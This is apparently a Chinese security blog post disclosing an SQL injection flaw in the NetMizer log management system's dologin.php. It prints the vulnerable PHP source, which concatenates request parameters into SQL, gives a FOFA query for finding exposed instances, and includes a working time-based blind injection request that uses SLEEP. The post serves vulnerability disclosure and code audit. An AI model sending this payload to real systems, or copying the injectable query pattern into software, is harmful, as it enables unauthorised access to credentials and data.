---
title: "NetMizer日志管理系统 dologin.php SQL注入漏洞"
source: https://mrxn.net/jswz/netmizer-data-login-dologin-username-sqli.html
asset_dir: assets/netmizer日志管理系统-dologin.php-sql注入漏洞
---

# NetMizer日志管理系统 dologin.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/15 08:32
- 874浏览
- [0评论](#comment)
- 2小时阅读

深入探索

软件

SQL

身份验证

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/login/dologin.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `/data/login/dologin.php` 业务实现关键逻辑部分

```
<?php
    include("../include/JSON.php");

    $conn_id = mysql_connect($dsn,$dbuser,$dbpasswd);
    mysql_select_db("sysmonitor");

    $sqltable = "tbl_admin";
    $sqlfrom = $sqltable;

    $sqlsessiontable = "tbl_admin_session";
    $sqlsessionfrom = $sqlsessiontable;

    $allow_wrongnum = 3;

    function gen_session($name, $ifsuccess){
       global $sqlsessionfrom;
       global $sqlfrom;
       global $allow_wrongnum;

       $t=time();
       $ip = ip2long(getIP());
       $usersessionid= $_COOKIE["usersessionid"];

       $sqlstr = "SELECT DISTINCT user_name,wrong_times from $sqlsessionfrom where session_id='$usersessionid' and access_time>=".($t-300);
       $res=mysql_query($sqlstr);
       $have = 0;
       $wrong_times = 0;
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $have = 1;
          $wrong_times = $row['wrong_times'];
       }
       if($ifsuccess){
          if($have == 0){
             $usersessionid=md5($t.$name);
             setcookie("usersessionid", "$usersessionid", $t + 3600, "/");
             $cmd1="insert into $sqlsessionfrom (session_id,user_name,login_time,access_time,wrong_times,login_ip) VALUES('$usersessionid','$name',$t,$t,0,'$ip')";
          } else {
             $cmd1 = "update tbl_admin_session set access_time=$t,wrong_times=0 where session_id='$usersessionid'";

          }
          $cmd2="delete from $sqlsessionfrom where access_time<".($t-3600);
          $ret = mysql_query($cmd1);
          $ret = mysql_query($cmd2);
       } else {
          if($have){
             $wrong_times = $wrong_times + 1;
             if($wrong_times == $allow_wrongnum){
                if($name == "admin") $errstr = "密码失败次数过多，等待5分钟后再登录";
                else {
                   $sqlstr = "update $sqlfrom set status=0,disable_time=$t where username='$name'";
                   $res=mysql_query($sqlstr);
                   $errstr = "密码失败次数过多，账户已经被禁止<br>联系管理员解除禁止,且等待5分钟后再登录";
                }
                echo "{'success':true, 'datas':'$errstr'}";
                exit();
             }
             $sqlstr = "update tbl_admin_session set access_time=$t,wrong_times=$wrong_times where session_id='$usersessionid'";
             $res=mysql_query($sqlstr);
          } else {
             $usersessionid=md5($t.$name);
             setcookie("usersessionid", "$usersessionid", $t + 3600, "/");
             $cmd1="insert into $sqlsessionfrom (session_id,user_name,login_time,access_time,wrong_times,login_ip) VALUES('$usersessionid','$name',$t,$t,1,'$ip')";
             $cmd2="delete from $sqlsessionfrom where access_time<".($t-3600);
             $ret = mysql_query($cmd1);
             $ret = mysql_query($cmd2);
          }
       }
       return $ret;
    }

    function do_sql_login($username, $password) {
       global $sqlfrom;
       global $jump;
       if($jump){
          $username = "admin";
          $session = gen_session($username, 0);
          mysql_close($conn_id);
          return 0;
       }
       $sqlstr = "SELECT password,status FROM $sqlfrom WHERE username='".$username."'";
       $res = mysql_query($sqlstr);
       if($res){
          $have = 0;
          while($row = mysql_fetch_array($res,MYSQL_BOTH)){
             $have = 1;
             $status = $row["status"];
             if($status == 0) return -3;
             $pwd = $row["password"];
             if($password!="") $password = crypt($password,"poseidon");
             if($pwd == $password){
                $session = gen_session($username, 1);
                mysql_close($conn_id);
                return 0;
             } else {
                $session = gen_session($username, 0);
                mysql_close($conn_id);
                return -4;
             }
          }
          mysql_close($conn_id);
          if($have == 0) return -2;
       } else return -1;
    }

    if(!isset($jump)) $jump = 0;
    if($action == 'login'){
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');
       $passwd = mb_convert_encoding($passwd, 'gbk', 'UTF-8');

       $res = do_sql_login($username,$passwd);
       if($res < 0){
          if($res == -1) $errstr = "连接数据库失败";
          else if($res == -2) $errstr = "该用户不存在";
          else if($res == -3) $errstr = "该用户处于禁止状态";
          else if($res == -4) $errstr = "密码错误<br>连续错误".$allow_wrongnum."次后账户将会被禁止登录";
          echo "{'success':true, 'datas':'$errstr'}";
       } else {
          if($jump) echo "<meta http-equiv=\"Refresh\" content=\"2; url=../../main.html\">"; 
          else echo '{"success":true, "datas":"success"}';
       }
       mysql_close($conn_id);
       return;
    } else if($action == 'changepw'){
       $old_password = mb_convert_encoding($old_password, 'gbk', 'UTF-8');
       $new_password = mb_convert_encoding($new_password, 'gbk', 'UTF-8');

       $usersessionid= $_COOKIE["usersessionid"];
       $sqlstr = "SELECT DISTINCT user_name from $sqlsessionfrom where session_id='$usersessionid' ";
       $res=mysql_query($sqlstr);
       $username = "";
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $username = $row["user_name"];
       }
       if($username == ""){
          $errstr = "查询不到该用户！";
          echo "{'success':false,'info':'$errstr'}";
          return;
       }

       $sqlstr = "SELECT password FROM $sqlfrom WHERE username='".$username."'";
       $res = mysql_query($sqlstr);
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $pwd = $row["password"];
          if($old_password!="") $password = crypt($old_password,"poseidon");
          if($pwd != $password){
             $errstr = "旧密码错误！";
             echo "{'success':false,'info':'$errstr'}";
             return;
          }
       }

       $newpasswd = crypt($new_password,"poseidon");
       $cmd="update $sqlfrom set password='$newpasswd' where username='".$username."'";
       $ret = mysql_query($cmd);
       mysql_close($conn_id);
       $errstr = "修改成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'show'){
       checkop('adminconf_r');
       $sqlstr = "select * from $sqlfrom";
       $res=mysql_query($sqlstr);
       $arr_result = array();
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $arr_result[] = array(
             'username'=>$row['username'],
             'password'=>'no change rdh',
             'status'=>$row['status'],
             'disable_time'=>date('Y-m-d H:i:s', $row['disable_time']),
             'right0'=>$row['right0'],
             'right1'=>$row['right1'],
             'right2'=>$row['right2'],
             'right3'=>$row['right3'],
             'right4'=>$row['right4'],
             'right5'=>$row['right5'],
             'right6'=>$row['right6'],
             'right7'=>$row['right7'],
          );
       }
       mysql_close($conn_id);
       $str = array("success"=>true, "datas"=>$arr_result);
       $json = json_encode($str);
       echo $json;
       return;
    } else if($action == 'new'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');
       $password = mb_convert_encoding($password, 'gbk', 'UTF-8');

       $sqlstr = "select * from $sqlfrom where username='$username'";
       $res=mysql_query($sqlstr);
       $have = 0;
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          $have = 1;
       }
       if($have){
          $errstr = mb_convert_encoding("用户已经存在！", 'UTF-8', 'gbk');
          $errstr = "用户已经存在！";
          echo "{'success':false, 'info':'$errstr'}";
          return;
       }

       if($status == 0) $disable_time = time();
       else $disable_time = 0;

       $newpasswd = crypt($password,"poseidon");
       $sqlstr = "insert into $sqlfrom (username,password,status,disable_time,right0,right1,right2,right3,right4,right5,right6,right7) values('$username','$newpasswd',$status,$disable_time,$right0,$right1,$right2,$right3,$right4,$right5,$right6,$right7);";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "增加成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'modify'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');
       $password = mb_convert_encoding($password, 'gbk', 'UTF-8');

       $sqlstr = "select * from $sqlfrom where username='$username'";
       $res=mysql_query($sqlstr);
       $arr_set = array();
       while($row = mysql_fetch_array($res,MYSQL_BOTH)){
          if($password != 'no change rdh') $arr_set['password'] = crypt($password,"poseidon");
          if($status != $row['status']) $arr_set['status'] = $status;
          if($right0 != $row['right0']) $arr_set['right0'] = $right0;
          if($right1 != $row['right1']) $arr_set['right1'] = $right1;
          if($right2 != $row['right2']) $arr_set['right2'] = $right2;
          if($right3 != $row['right3']) $arr_set['right3'] = $right3;
          if($right4 != $row['right4']) $arr_set['right4'] = $right4;
          if($right5 != $row['right5']) $arr_set['right5'] = $right5;
          if($right6 != $row['right6']) $arr_set['right6'] = $right6;
          if($right7 != $row['right7']) $arr_set['right7'] = $right7;
       }

       $setstr = "set ";
       $first = 1;
       foreach($arr_set as $k => $v){
          if($first == 1) $first = 0;
          else $setstr .= " , ";

          if($k == 'password') $setstr .= "$k='$v'";
          else $setstr .= "$k=$v";
       }

       $sqlstr = "update $sqlfrom $setstr where username='$username'";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "修改成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'delete'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');

       $sqlstr = "delete from $sqlfrom where username='$username'";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "删除成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } else if($action == 'u_enable' || $action == 'u_disable'){
       checkop('adminconf_w');
       $username = mb_convert_encoding($username, 'gbk', 'UTF-8');

       if($action == 'u_enable') $status = 1;
       else $status = 0;

       if($status == 0) $disable_time = time();
       else $disable_time = 0;

       $sqlstr = "update $sqlfrom set status=$status,disable_time=$disable_time where username='$username'";
       $res=mysql_query($sqlstr);
       mysql_close($conn_id);
       $errstr = "操作成功！";
       echo "{'success':true,'info':'$errstr'}";
       return;
    } 
?>
```

在 `gen_session` 和 `do_sql_login` 方法内部，以及多个 action 分支里，均存在直接将参数拼接进SQL语句中执行，造成[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

代码安全审计

```
POST /data/login/dologin.php HTTP/1.1
Host: netmizer.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=login&username=' AND (SELECT 123 FROM (SELECT(SLEEP(3)))ABC) AND 'AAA'='AAA&passwd=123456
```

成功延时 3 秒

[![NetMizer日志管理系统 dologin.php SQL注入漏洞](images/img-001-1e875391d830.webp)](https://image.mrxn.net/617b8200f1e44af0a62fd5cb47ea4793.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
